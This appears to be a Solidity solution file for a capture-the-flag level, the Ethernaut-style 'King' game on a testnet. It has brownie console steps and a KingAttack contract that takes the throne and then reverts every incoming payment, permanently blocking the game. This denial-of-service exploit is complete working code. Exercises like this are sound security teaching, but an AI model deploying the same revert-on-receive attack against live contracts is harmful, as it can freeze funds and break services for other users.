/*

create a contract that sends eth to the King contract , to break the King contract, 
add a revert statement to the receive function so everytime fallback tries to send eth to your contract 
the transaction reverts 

# Open brownie console with rinkeby testnet

brownie console --network rinkeby

# import your account using mnemonic

accounts.from_mnemonic("your account mnemonic")

# Deloy the attack Contract

# send Eth to sendETH() function, greater than the current prize value

# confirm king is your address

# Submit

# (OPTIONAL) destroy() to cleanup

*/


// SPDX-License-Identifier: MIT
pragma solidity 0.8.6;


contract KingAttack {


    address owner;

    constructor()  {
        owner = msg.sender;
        }

    function sendEth(address payable _king) public payable  {
        // send eth to the King Contract
        (bool success,) = _king.call{gas: 50000, value: address(this).balance}("");
        require(success);

        }


    receive() external payable {
        // revert when recieving eth from King contract. this will prevent the King contract from fully excuting the fallback function code
        // note :  the transfer function in King Contract reverts upon failed transfer
        revert();

    }

    function destroy() external {

        selfdestruct(payable(owner));
    
    }

}


